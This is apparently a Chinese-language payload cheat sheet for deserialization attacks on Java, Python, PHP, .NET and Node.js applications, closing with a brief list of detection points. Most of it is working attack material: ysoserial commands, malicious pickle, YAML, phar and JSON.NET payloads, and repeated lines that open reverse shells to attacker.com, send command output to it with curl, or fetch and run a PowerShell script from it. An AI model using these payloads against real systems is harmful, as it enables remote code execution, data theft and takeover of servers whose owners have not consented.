# 反序列化漏洞 Payload 模板

## Java 反序列化

### 基础检测

```
# 检测 ysoserial 是否可用
java -jar ysoserial.jar URLDNS "http://attacker.com"

# 常见 gadget chain
CommonsBeanutils1
CommonsCollections1
CommonsCollections2
CommonsCollections3
CommonsCollections4
CommonsCollections5
CommonsCollections6
Jdk7u21
Jdk8u20
Groovy1
Spring1
```

### 命令执行

```bash
# ysoserial 生成 payload
java -jar ysoserial.jar CommonsCollections1 "id"
java -jar ysoserial.jar CommonsCollections5 "curl http://attacker.com/?d=$(id|base64)"
java -jar ysoserial.jar CommonsBeanutils1 "bash -c {curl,http://attacker.com/?d=$(id|base64)}"

# 反弹 shell
java -jar ysoserial.jar CommonsCollections5 "bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"
java -jar ysoserial.jar CommonsBeanutils1 "bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"
```

### URLDNS (DNS 外带)

```bash
# DNS 外带检测
java -jar ysoserial.jar URLDNS "http://attacker.dnslog.cn"

# Base64 编码输出
java -jar ysoserial.jar URLDNS "http://attacker.dnslog.cn" | base64 | tr -d '\n'
```

### JRMP 反射

```bash
# 启动 JRMP 服务端
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 4444 CommonsCollections5 "curl http://attacker.com"

# 客户端连接
# 在目标服务器上反序列化连接 JRMP 服务端的 payload
```

### 常见框架

#### Apache Shiro

```bash
# 检测 Shiro
# 默认 key: kPH+bIxk5D2deZiIxcaaaA==

# 使用工具
java -jar shiro_attack.jar -g CommonsCollections2 -f shell.sh -t 1 -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"

# 手动检测
import base64
from Crypto.Cipher import AES

def encode_rememberme(command):
    # Shiro default key
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    # Serialize and encrypt
    pass
```

#### WebLogic

```bash
# T3 协议反序列化
# CVE-2015-4852
python weblogic_exploit.py -t target.com -p 7001 -c "id"

# IIOP 协议
java -jar ysoserial.jar CommonsCollections1 "id" | nc target.com 7001
```

#### JBoss

```bash
# JMXInvokerServlet
curl -H "Content-Type: application/x-java-serialized-object" \
     --data-binary @payload.ser \
     http://target.com/jmx-console/HtmlAdaptor

# 使用工具
java -jar ysoserial.jar CommonsCollections5 "id" > payload.ser
curl -H "Content-Type: application/x-java-serialized-object" \
     --data-binary @payload.ser \
     http://target.com/invoker/JMXInvokerServlet
```

## Python 反序列化

### Pickle

```python
import pickle
import base64
import os

# 基础 payload
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())

# 反弹 shell
class ReverseShell:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"',))

# 带外数据
class OOB:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/?d=$(id|base64)',))
```

### PyYAML

```yaml
# 命令执行
!!python/object/apply:os.system ["id"]
!!python/object/apply:os.popen ["id"]

# 反弹 shell
!!python/object/apply:os.system ["bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"]

# 文件读取
!!python/object/apply:os.popen ["cat /etc/passwd"]
```

### Marshal

```python
import marshal
import base64

code = compile("__import__('os').system('id')", "<string>", "exec")
payload = marshal.dumps(code)
print(base64.b64encode(payload).decode())
```

## PHP 反序列化

### 基础 Payload

```php
<?php
// 简单示例
class Test {
    public $cmd = "id";
    function __destruct() {
        system($this->cmd);
    }
}

$obj = new Test();
echo serialize($obj);
// O:4:"Test":1:{s:3:"cmd";s:2:"id";}
?>
```

### Phar 反序列化

```php
<?php
class Exploit {
    public $cmd = "id";
    function __destruct() {
        system($this->cmd);
    }
}

$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$o = new Exploit();
$o->cmd = "curl http://attacker.com/?d=$(id|base64)";
$phar->setMetadata($o);
$phar->stopBuffering();

// 使用: phar://exploit.phar/test.txt
?>
```

### 常见 CMS

#### WordPress

```php
// PHP Object Injection
// 在 plugins 中查找 __wakeup, __destruct, __toString
```

#### Magento

```php
// Webshop POP chain
```

## .NET 反序列化

### ViewState

```bash
# 使用 ysoserial.net
ysoserial.net -g TypeConfuseDelegate -c "id" -o base64

# 反弹 shell
ysoserial.net -g TypeConfuseDelegate -c "powershell -c 'IEX(New-Object Net.WebClient).downloadString(\"http://attacker.com/shell.ps1\")'" -o base64
```

### JSON.NET

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "$values": ["cmd", "/c", "id"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
  }
}
```

## JavaScript/Node.js 反序列化

### node-serialize

```javascript
// RCE payload
var y = {
    rce: function() {
        require('child_process').exec('id', function(error, stdout, stderr) {
            console.log(stdout);
        });
    }
}
var s = require('node-serialize').serialize(y);
console.log(s);
// 添加 IIFE: {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(error,stdout,stderr){console.log(stdout)})}()"}
```

### serialize-to-js

```javascript
// 危险函数调用
function() { return require('child_process').execSync('id').toString(); }
```

## 检测方法

### 黑盒检测

```
1. 发送恶意序列化数据
2. 观察 DNS 外带
3. 观察时间延迟
4. 观察错误响应

检测点:
- Cookie (JSESSIONID, rememberMe)
- POST 参数
- HTTP Header
- 文件上传
- 自定义协议
```

### 白盒检测

```
1. 查找反序列化函数调用
   - Java: ObjectInputStream.readObject()
   - Python: pickle.loads(), yaml.load()
   - PHP: unserialize()
   - .NET: BinaryFormatter.Deserialize()
   - Node.js: node-serialize.unserialize()

2. 查找危险的 gadget chain
   - CommonsCollections
   - Spring
   - Groovy

3. 检查是否有过滤/白名单
```